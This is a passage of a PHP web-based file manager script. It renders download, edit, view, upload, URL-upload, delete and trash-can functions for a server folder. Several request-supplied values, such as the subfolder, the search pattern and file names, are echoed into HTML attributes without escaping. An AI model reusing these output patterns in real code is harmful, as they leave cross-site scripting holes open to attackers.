      }
   } else if (($act == "download") && ($subdir != $trashcan)) {
      if (isset($file) && ($file != "")) {
         $subdir = @dirname($file);
         if (!checkFileName($file) || (($subdir == "") && ($file == $trashcan)))
			redirectWithMsg("warning", "Invalid name for file to download");
         else {
            $fp = getFilePath($file);
            if (@is_readable($fp)) {
               @clearstatcache();
               header("Content-Type: application/force-download");
               header("Content-Transfer-Encoding: binary");
               header("Content-Length: ".@filesize($fp));
               header("Content-Disposition: attachment; filename=\"".@basename($file)."\"");
               @readfile($fp);
               exit;
            } else
               redirectWithMsg("error", "Unable to download file", $file);
         }
      } else
         redirectWithMsg("warning", "No name for file to download");
   } else
      redirectWithMsg("error", "Unknown or unsuitable action");
}

// Common part of the page
pageHeader();

echo "<p><table border=0 cellspacing=2 cellpadding=2>";
echo "<form action=$thisscript method=get name=searchForm>";
echo "<tr><td width=".(($showunixattrs) ? 310 : 360)."><b>";
if ($act == "search") {
   echo getMsg("", "Searched folder", $searchpattern)." (";
}
if ($subdir == "") {
   echo "Main folder";
} else if ($subdir == $trashcan) {
   echo "Trash can";
} else {
   echo "Sub-folder : ".htmlspecialchars($subdir);
}
if ($act == "search") echo ")";

echo "</b><br><span id=\"clock\" style=\"width:314px;\">".gmdate($dateformat, time() + 7 * 3600).'</spav>';
echo " (<a href=$thisscript?act=logout>Logout</a>)";
echo "</td>";

if (($subdir != $trashcan) && (($act == "") || ($act == "search"))) {
   echo "<td width=20 class=tdlt>&nbsp;</td>";
   echo "<td class=tdlt>";
   echo "<input name=act type=hidden value=search>";
   echo "<input name=subdir type=hidden value=\"$subdir\">";
   echo "<input name=sortby type=hidden value=$sortby>";
   echo "<input name=searchpattern type=text size=15 value=\"$searchpattern\"> ";
   echo "<input type=button value=\"Search\" onClick='submitActForm(document.searchForm, \"searchpattern\", \"".quoteJS("No search pattern")."\")'>";
   echo "<br><input type=checkbox value=true name=regexpsearch".(($regexpsearch) ? " checked" : "")."> Use regular expression";
   echo "</td>";
}

echo"</tr>";
echo "</form>";
echo "</table>";

// Edit or show page
if (($act == "edit") || ($act == "show") && ($subdir != $trashcan)) {
   if (isset($file) && ($file != "")) {
      if (!checkFileName($file) || (($subdir == "") && ($file == $trashcan))) {
         echo getMsg("warning", ($act == "edit") ? "Invalid name for file to edit" : "Invalid name for file to view");
      } else if (!checkExtension($file)) {
         echo getMsg("warning", ($act == "edit") ? "Invalid extension for file to edit" : "Invalid extension for file to view");
      } else {
         if (!isset($data)) {
            $fp = getFilePath($file);
            if ($fd = @fopen($fp, "r")) {
               $data = @fread($fd, @filesize($fp));
               @fclose($fd);
            } else
               echo getMsg("error", "Unable to read file %VAR1%");
         }
         if ($act == "edit") {
            echo "<p><b>Edit file : </b>".htmlspecialchars($file);
            echo "\n<script language=\"javascript\">";
            echo "\n<!--";
            echo "\nfunction cancelEdit() {";
            echo    "\nf = document.editForm;";
            echo    "\nf.act.value = '';";
            echo    "\nf.file.value = '';";
            echo    "\nf.data.value = '';";
            echo    "\nf.method = 'get';";
            echo    "\nf.submit();";
            echo "\n}";
            echo "\n//-->";
            echo "\n</script>\n";
            echo "<p><table border=0 cellspacing=0 cellpadding=10>";
            echo "<form action=$thisscript method=post name=editForm>";
            echo "<input name=act type=hidden value=save>";
            echo "<input name=subdir type=hidden value=\"$subdir\">";
            echo "<input name=sortby type=hidden value=$sortby>";
            echo "<input name=file type=hidden value=\"$file\">";
            echo "<tr>";
            echo "<td colspan=3>";
            echo "<textarea name=data cols=$editcols rows=$editrows>";
            echo htmlspecialchars($data);
            echo "</textarea>";
            echo "</td>";
            echo "</tr>";
            echo "<tr>";
            echo "<td align=left>";
            echo "<input type=radio name=fileformat value=dos".(($defaultfileformat == "dos") ? " checked" : "").">DOS / WINDOWS format";
            echo "<br><input type=radio name=fileformat value=unix".(($defaultfileformat == "unix") ? " checked" : "").">UNIX format";
            echo "</td>";
            echo "<td align=center>";
            echo "<input type=submit value=\"Save\">";
            echo "</td>";
            echo "<td align=right>";
            echo "<input type=button value=\"Cancel\" onClick='cancelEdit()'>";
            echo "</td>";
            echo "</tr>";
            echo "</form>";
            echo "</table>";
         } else {
            echo "<p><b>View file : </b>".htmlspecialchars($file);
            echo "<p><table border=0 cellspacing=0 cellpadding=10>";
            echo "<tr><td width=700><pre>".htmlspecialchars($data)."</pre>&nbsp;</td></tr>";
            echo "</table>";
            echo "<p><a href=$thisscript?subdir=".rawurlencode($subdir)."&sortby=$sortby onMouseOver='return statusMsg(\"".quoteJS("Return to file list")."\");' onMouseOut='return statusMsg(\"\");'>Return to file list</a>";
         }
      }
   } else
      echo getMsg("warning", ($act == "edit") ? "No name for file to edit" : "No name for file to view");
// File list page
} else {
   echo "\n<script language=javascript>";
   echo "\n<!--";
   echo "\nfunction submitListForm(action) {";
   echo    "\nf = document.listForm;";
   echo    "\nfilechecked = 0;";
   if ($act == "search") {
      echo "\nsubdir = '';";
      echo "\nfilesubdir = new Array();";
      reset($files);
      $i = 0;
      while (list($key, $file) = each($files))
         if (!@is_dir($file["path"])) echo "\nfilesubdir[".$i++."] = \"".extractSubdir(@dirname($file["path"]))."\";";
   } else {
      echo "\ndirchecked = false;";
      echo "\nisdir = new Array();";
      reset($files);
      $i = 0;
      while (list($key, $file) = each($files))
         if ($file["level"] == 9) echo "\nisdir[".$i++."] = ".(($file["dir"]) ? "true" : "false");
   }
   echo "\nif (f.elements['selfiles[]']) {";
   echo    "\nif (f.elements['selfiles[]'].length > 1) {";
   echo       "\nfor (i = 0; i < f.elements['selfiles[]'].length; i++) {";
   echo          "\nif (f.elements['selfiles[]'][i].checked) {";
   echo             "\nfilechecked++;";
   if ($act == "search")
      echo "\nsubdir = filesubdir[i];";
   else
      echo "\nif (isdir[i]) dirchecked = true;";
   echo          "\n}";
   echo       "\n}";
   echo    "\n} else {";
   echo       "\nif (f.elements['selfiles[]'].checked) filechecked = 1;";
   if ($act == "search")
      echo "\nsubdir = filesubdir[0];";
   else
      echo "\nif (isdir[0]) dirchecked = true;";
   echo   "\n}";
   echo "\n}";
   if ($act != "search") {
      echo "\ndestchecked = false;";
      echo "\nif (f.dest) {";
      echo    "\nif (f.dest.length > 1) {";
      echo       "\nfor (i = 0; i < f.dest.length; i++) {";
      echo          "\nif (f.dest[i].checked) {";
      echo             "\ndestchecked = true;";
      echo             "\nbreak;";
      echo          "\n}";
      echo       "\n}";
      echo    "\n} else {";
      echo       "\ndestchecked = f.dest.checked;";
      echo    "\n}";
      echo "\n}";
      echo "\nif ((action == 'empty') && confirm(\"Are you sure ?\")) {";
      echo    "\nf.act.value = action;";
      echo    "\nf.submit();";
      echo "\n} else if ((action == 'move') && ((filechecked == 0) || !destchecked)) {";
      echo    "\nalert(\"".quoteJS("No file or destination folder selected")."\");";
      echo "\n} else if (filechecked == 0) {";
      echo    "\nalert(\"".quoteJS("No file selected")."\");";
      echo "\n} else if ((action != 'delete') && (action != 'forcedelete') && (action != 'move') && (action != 'restore') && (filechecked > 1)) {";
      echo    "\nalert(\"".quoteJS("Too many files or folders selected")."\");";
      //echo "\n} else if ((action != 'move') && (action != 'rename') && (action != 'rmdir') && dirchecked) {";
      //echo    "\nalert(\"".quoteJS("Select only files")."\");";
      echo "\n} else if ((action == 'rmdir') && !dirchecked) {";
      echo    "\nalert(\"".quoteJS("Select a folder")."\");";
      echo "\n} else if ((action == 'rename') && (f.renameto.value == '')) {";
      echo    "\nalert(\"".quoteJS("No new name for file rename")."\");";
      echo "\n} else if ((action == 'copy') && (f.copyto.value == '')) {";
      echo    "\nalert(\"".quoteJS("No copy name for file to copy")."\");";
      echo "\n} else if (((action == 'delete') || (action == 'forcedelete') || (action == 'rmdir')) && confirm(\"".quoteJS("Are you sure")." ?\")) {";
      echo    "\nf.act.value = action;";
      echo    "\nf.submit();";
      echo "\n} else if ((action != 'delete' && action != 'forcedelete') && (action != 'rmdir')) {";
      echo    "\nf.act.value = action;";
      echo    "\nf.submit();";
      echo "\n}";
   } else {
      echo "\nif (filechecked == 0) {";
      echo    "\nalert(\"".quoteJS("No file selected")."\");";
      echo "\n} else if (filechecked > 1) {";
      echo    "\nalert(\"".quoteJS("Too many files or folders selected")."\");";
      echo "\n} else {";
      echo    "\nf.subdir.value = subdir;";
      echo    "\nf.act.value = '';";
      echo    "\nf.submit();";
      echo "\n}";
   }
   echo "\n}";
   echo "\nfunction submitActForm(f, n, m) {";
   echo    "\nif (f.elements[n].value == f.elements[n].defaultValue) {";
   echo       "\nalert(m);";
   echo    "\n} else {";
   echo       "\nf.submit();";
   echo    "\n}";
   echo "\n}";
   if ($act != "search") {
      echo "\nfunction selectAll() {";
      echo    "\nf = document.listForm;";
      echo    "\nc = f.selectall.checked;";
      echo    "\nif (f.elements['selfiles[]']) {";
      echo       "\nif (f.elements['selfiles[]'].length > 1) {";
      echo          "\nfor (i = 0; i < f.elements['selfiles[]'].length; i++) f.elements['selfiles[]'][i].checked = c;";
      echo       "\n} else {";
      echo          "\nf.elements['selfiles[]'].checked = c;";
      echo       "\n}";
      echo    "\n}";
      echo "\n}";
   }
   echo "\n//-->";
   echo "\n</script>\n";
   if (!empty($files)) {
      echo "<p><table border=0 cellspacing=2 cellpadding=2>";
      echo "<form action=$thisscript method=post name=listForm>";
      echo "<input name=act type=hidden value=''>";
      echo "<input name=subdir type=hidden value=\"$subdir\">";
      echo "<input name=sortby type=hidden value=$sortby>";
      echo "<tr>";
      echo "<td width=25 height=0 class=tdcc></td>";
      echo "<td width=25 height=0 class=tdcc></td>";
      echo "<td width=".(($showunixattrs) ? 250 : 300)." height=0 class=tdcc></td>";
      echo "<td width=100 height=0 class=tdcc></td>";
      echo "<td width=130 height=0 class=tdcc></td>";
      if ($showunixattrs) {
         echo "<td width=100 height=0 class=tdcc></td>";
         echo "<td width=75 height=0 class=tdcc></td>";
         echo "<td width=75 height=0 class=tdcc></td>";
         $nbcols = 9;
      } else {
         echo "<td width=50 height=0 class=tdcc></td>";
         $nbcols = 7;
      }
      echo "<td width=50 height=0 class=tdcc></td>";
      echo "</tr>";
      echo "<tr>";
      echo "<th>Sel</th>";
      echo "<th>To</th>";
      echo "<th>";
      echo "<a href=$thisscript?subdir=".rawurlencode($subdir)."&sortby=name".(($act == "search") ? "&act=search&searchpattern=".rawurlencode($searchpattern) : "")." onMouseOver='return statusMsg(\"".quoteJS("Sort files by name")."\");' onMouseOut='return statusMsg(\"\");'>Name</a>";
      echo "</th>";
      echo "<th>";
      echo "<a href=$thisscript?subdir=".rawurlencode($subdir)."&sortby=size".(($act == "search") ? "&act=search&searchpattern=".rawurlencode($searchpattern) : "")." onMouseOver='return statusMsg(\"".quoteJS("Sort files by size")."\");' onMouseOut='return statusMsg(\"\");'>Size</a>";
      echo "</th>";
      echo "<th>";
      echo "<a href=$thisscript?subdir=".rawurlencode($subdir)."&sortby=date".(($act == "search") ? "&act=search&searchpattern=".rawurlencode($searchpattern) : "")." onMouseOver='return statusMsg(\"".quoteJS("Sort files by date")."\");' onMouseOut='return statusMsg(\"\");'>Date</a>";
      echo "</th>";
      if ($showunixattrs) {
         echo "<th>Perms</th>";
         echo "<th>Owner</th>";
         echo "<th>Group</th>";
      } else
         echo "<th>Read<br>Only</th>";
      echo "<th>Action</th>";
      echo "</tr>";
      // Files and directories
      $total = 0;
      $nbfiles = 0;
      $nbdirs = 0;
      reset($files);
      while(list($key, $file) = each($files)) {
         // Directory section
         if ($file["dir"]) {
            if ((($subdir != "") || ($file["name"] != "..")) && ($file["alias"] != ".")) {
               echo "<tr onmouseover=\"this.style.backgroundColor='#FFCC00';\" onmouseout=\"this.style.backgroundColor='#F0F0F0';\">";
               if ($file["level"] == 9)
                  echo "<td><input type=checkbox name=\"selfiles[]\" value='".$file["name"]."'></td>";
               else
                  echo "<td>&nbsp;</td>";
               if (($file["level"] != 1) && ($subdir != $trashcan))
                  echo "<td><input type=radio name=dest value='".$file["name"]."'></td>";
			   else
                  echo "<td>&nbsp;</td>";
               echo "<td>";
               if ($file["link"])
                  echo "<i><b>".htmlspecialchars($file["name"])."</b></i>";
               else {
                  echo "<a href=$thisscript?subdir=".rawurlencode(extractSubdir($file["path"]))."&sortby=$sortby onMouseOver='return statusMsg(\"".quoteJS($file["statusmsg"])."\");' onMouseOut='return statusMsg(\"\");'>";
				  
				  echo "<b>".$file["alias"]."</b>";
				  
                  echo "</a>";
               }
               echo "</td>";
               echo "<td>&nbsp;</td>";
               echo "<td align=right>".$file["date"]."</td>";
               if ($showunixattrs) {
                  echo "<td align=center><span class=fix>".$file["perms"]."</span></td>";
                  echo "<td align=right>".$file["owner"]."</td>";
                  echo "<td align=right>".$file["group"]."</td>";
               } else
                  echo "<td align=center>".(($file["readonly"]) ? "Yes" : "&nbsp;")."</td>";
               echo "<td>&nbsp;</td>";
               echo "</tr>";
               if ($file["level"] == 9) $nbdirs++;
            }
         // File section
         } else {
            echo "<tr onmouseover=\"this.style.backgroundColor='#FFCC00';\" onmouseout=\" this.style.backgroundColor='#F0F0F0';\">";
            echo "<td><input type=checkbox name=\"selfiles[]\" value='".$file["name"]."'>&nbsp;</td>";
            echo "<td>&nbsp;</td>";
            echo "<td>".(($file["link"]) ? "<i>" : "");
            if ($filelinks) {
               if ($basevirtualdir == "")
                  echo "<a target=\"_blank\" href=".str_replace("%2F", "/", rawurlencode(extractSubdir($file["path"])));
               else
                  echo "<a target=\"_blank\" href=".$basevirtualdir."/".rawurlencode($file["name"]);
               echo " onMouseOver='return statusMsg(\"".quoteJS($file["statusmsg"])."\");' onMouseOut='return statusMsg(\"\");'>";
               echo $file["alias"];
               echo "</a>";
            } else
               echo htmlspecialchars($file["name"]);
            echo (($file["link"]) ? "</i>" : "")."</td>";
            echo "<td align=right>".view_size($file["size"])."</td>";
            echo "<td align=right>".$file["date"]."</td>";
            if ($showunixattrs) {
               echo "<td align=center><span class=fix>".$file["perms"]."</span></td>";
               echo "<td align=right>".$file["owner"]."</td>";
               echo "<td align=right>".$file["group"]."</td>";
            } else
               echo "<td align=center>".(($file["readonly"]) ? "Yes" : "&nbsp;")."</td>";
            echo "<td align=center>&nbsp;";
            if (($act != "search") && checkExtension($file["name"]) && ($subdir != $trashcan)) {
                  echo "<a href=$thisscript?act=edit&subdir=".rawurlencode($subdir)."&sortby=$sortby&file=".rawurlencode($file["name"])." onMouseOver='return statusMsg(\"".quoteJS("Edit file")."\");' onMouseOut='return statusMsg(\"\");'>E</a> ";
               echo "<a href=$thisscript?act=show&subdir=".rawurlencode($subdir)."&sortby=$sortby&file=".rawurlencode($file["name"])." onMouseOver='return statusMsg(\"".quoteJS("View file")."\");' onMouseOut='return statusMsg(\"\");'>V</a> ";
            } 
            if ($subdir != $trashcan)
               echo "<a href=$thisscript?act=download&subdir=".rawurlencode($subdir)."&sortby=$sortby&file=".str_replace("%2F", "/", rawurlencode(extractSubdir($file["path"])))." onMouseOver='return statusMsg(\"".quoteJS("Download file")."\");' onMouseOut='return statusMsg(\"\");'>D</a> ";
            echo "</td>";
            echo "</tr>";
            
            $total += $file["size"];
            $nbfiles++;
         }
      }
      if (($act != "search") && ($nbfiles > 0)) {
         echo "<th align=left><input type=checkbox name=selectall onClick=\"selectAll()\"></th>";
         $n = $nbcols - 1;
      } else
         $n = $nbcols;
      echo "<th colspan=$n>$nbdirs directories, $nbfiles files (".view_size($total).")</th>";
      echo "</tr>";
      echo "<tr><td class=tdrt colspan=$nbcols>&nbsp;</td></tr>";

      // Action forms
      if ($act == "search") {
         echo "<tr>";
         echo "<td class=tdrt colspan=3>";
         echo "&nbsp;";
         echo "</td>";
         echo "<td class=tdlt colspan=".($nbcols - 3).">";
         echo "<input type=button value=\"Go to folder\" onClick='submitListForm(\"goto\")'>";
         echo "</td>";
         echo "</tr>";
      }
      if (($act != "search")
         && ($subdir != $trashcan)
         && ((($subdir != "") && (($nbfiles > 0) || ($nbdirs > 0)))
         || (($subdir == "") && ($nbfiles > 0) && ($nbdirs > 0)) ) ) {
         echo "<tr>";
         echo "<td class=tdrt colspan=3>";
         echo "&nbsp;";
         echo "</td>";
         echo "<td class=tdlt colspan=".($nbcols - 3).">";
         echo "<input type=button value=\"Move to Folder\" onClick='submitListForm(\"move\")'>";
         echo "</td>";
         echo "</tr>";
      }
      if (($act != "search")
          && ($subdir != $trashcan) 
          && ($nbfiles > 0)) {
         echo "<tr>";
         echo "<td class=tdrt colspan=3>";
         echo "&nbsp;";
         echo "</td>";
         echo "<td class=tdlt colspan=".($nbcols - 3).">";
         echo "<input type=button value=\"Delete to Recycle Bin\" onClick='submitListForm(\"delete\")'>";
         echo "</td>";
         echo "</tr>";
      }

      if (($act != "search")
          && ($subdir != $trashcan) 
          && ($nbdirs > 0) 
          && @is_dir($basedir."/".$trashcan) ) {
         echo "<tr>";
         echo "<td class=tdrt colspan=3>";
         echo "&nbsp;";
         echo "</td>";
         echo "<td class=tdlt colspan=".($nbcols - 3).">";
         echo "<input type=button value=\"Remove Dir\" onClick='submitListForm(\"rmdir\")'>";
         echo "</td>";
         echo "</tr>";
      }
	  if (($act != "search")
          && ($subdir != $trashcan) 
          && ($nbfiles > 0)) {
         echo "<tr>";
         echo "<td class=tdrt colspan=3>";
         echo "&nbsp;";
         echo "</td>";
         echo "<td class=tdlt colspan=".($nbcols - 3).">";
         echo "<input type=button value=\"Force Delete\" onClick='submitListForm(\"forcedelete\")'>";
         echo "</td>";
         echo "</tr>";
      }
	  
      if (($act != "search")
          && ($subdir != $trashcan)
          && (($nbfiles > 0) || ($nbdirs > 0)) ) {
         echo "<tr>";
         echo "<td class=tdrt colspan=3>";
         echo "&nbsp;";
         echo "</td>";
         echo "<td class=tdlt colspan=".($nbcols - 3).">";
         echo "<input type=text name=renameto size=15> ";
         echo "<input type=button value=\"Rename\" onClick='submitListForm(\"rename\")'>";
         echo "</td>";
         echo "</tr>";
      }
      if (($act != "search")
          && ($subdir != $trashcan)
          && ($nbfiles > 0) ) {
         echo "<tr>";
         echo "<td class=tdrt colspan=3>";
         echo "&nbsp;";
         echo "</td>";
         echo "<td class=tdlt colspan=".($nbcols - 3).">";
         echo "<input type=text name=copyto size=15> ";
         echo "<input type=button value=\"Copy\" onClick='submitListForm(\"copy\")'>";
         echo "</td>";
         echo "</tr>";
      }
	  /*
      if (($act != "search") && ($subdir != $trashcan) && ($nbfiles > 0) ) {
         echo "<tr>";
         echo "<td class=tdrt colspan=3>";
         echo "Alias <b>selected</b> file with :&nbsp;";
         echo "</td>";
         echo "<td class=tdlt colspan=".($nbcols - 3).">";
         echo "<input type=text name=aliasto size=15> ";
         echo "<input type=button value=\"Alias\" onClick='submitListForm(\"alias\")'>";
         echo "</td>";
         echo "</tr>";
      } */
      if (($act != "search")
          && ($subdir == $trashcan)
          && ($nbfiles > 0) ) {
         echo "<tr>";
         echo "<td class=tdrt colspan=3>";
         echo "&nbsp;";
         echo "</td>";
         echo "<td class=tdlt colspan=".($nbcols - 3).">";
         echo "<input type=button value=\"Restore\" onClick='submitListForm(\"restore\")'>";
         echo "</td>";
         echo "</tr>";
      }
      if (($act != "search")
          && ($subdir == $trashcan)
          && ($nbfiles > 0) ) {
         echo "<tr>";
         echo "<td class=tdrt colspan=3>";
         echo "&nbsp;";
         echo "</td>";
         echo "<td class=tdlt colspan=".($nbcols - 3).">";
         echo "<input type=button value=\"Empty\" onClick='submitListForm(\"empty\")'>";
         echo "</td>";
         echo "</tr>";
      }
      echo "</form>";
      if ($subdir != $trashcan) {
         echo "<tr><td class=tdrt colspan=$nbcols>&nbsp;</td></tr>";
         if ($act != "search") {
            echo "<form action=$thisscript method=post name=createDirForm>";
            echo "<input name=act type=hidden value=mkdir>";
            echo "<input name=subdir type=hidden value=\"$subdir\">";
            echo "<input name=sortby type=hidden value=$sortby>";
            echo "<tr>";
            echo "<td class=tdrt colspan=3>";
            echo "&nbsp;";
            echo "</td>";
            echo "<td class=tdlt colspan=".($nbcols - 3).">";
            echo "<input name=file type=text size=15> ";
            echo "<input type=button value=\"Create folder\" onClick='submitActForm(document.createDirForm, \"file\", \"".quoteJS("No name for folder to create")."\")'>";
            echo "</td>";
            echo "</tr>";
            echo "</form>";
         }
         if ($act != "search") {
            echo "<form action=$thisscript method=post name=createFileForm>";
            echo "<input name=act type=hidden value=create>";
            echo "<input name=subdir type=hidden value=\"$subdir\">";
            echo "<input name=sortby type=hidden value=$sortby>";
            echo "<tr>";
            echo "<td class=tdrt colspan=3>";
            echo "&nbsp;";
            echo "</td>";
            echo "<td class=tdlt colspan=".($nbcols - 3).">";
            echo "<input name=file type=text size=15> ";
            echo "<input type=button value=\"Create file\" onClick='submitActForm(document.createFileForm, \"file\", \"".quoteJS("No name for file to create")."\")'>";
            echo "</td>";
            echo "</tr>";
            echo "</form>";
         }
         if ($act != "search") {
            echo "<form action=$thisscript method=post enctype=multipart/form-data name=uploadFileForm>";
            echo "<input name=\"act\" type=hidden value=\"upload\">";
            echo "<input name=\"subdir\" type=hidden value=\"".$subdir."\">";
            echo "<input name=\"sortby\" type=\"hidden\" value=\"".$sortby."\">";
            echo "<input name=\"max_file_size\" type=\"hidden\" value=\"".$uploadmaxsize."\">";
            echo "<tr>";
            echo "<td class=\"tdrt\" colspan=\"3\">";
            echo "&nbsp;";
            echo "</td>";
            echo "<td class=\"tdlt\" colspan=".($nbcols - 3).">";
            echo "<input name=\"file\" type=\"file\" size=\"15\" style=\"width: 123px;\">";
            echo "<input type=\"button\" value=\"Upload\" onClick=\"submitActForm(document.uploadFileForm, 'file', '".quoteJS("No name for file to upload")."')\">";
            echo "</td>";
            echo "</tr>";
            echo "</form>";
         }
         if ($act != "search") {
            echo '<form action="'.$thisscript.'" method="post" name="uploadUrlForm">';
            echo '<input name="act" type="hidden" value="urlupload">';
            echo '<input name="subdir" type="hidden" value="'.$subdir.'">';
            echo '<input name="sortby" type="hidden" value="'.$sortby.'">';
            echo '<tr>';
            echo "<td class=\"tdrt\" colspan=\"3\">";
            echo "&nbsp;";
            echo "</td>";
            echo "<td class=\"tdlt\" colspan=".($nbcols - 3).">";
            echo '<input name="file" type="text" size="15" value="http://">';
            echo "<input type=button value=\"URL Upload\" onClick='submitActForm(document.uploadUrlForm, \"file\", \"".quoteJS("No URL to upload")."\")'>";
            echo "</td>";
            echo "</tr>";
            echo "</form>";
         }
      }
      echo "</table>";
   }
}
pageFooter();
?>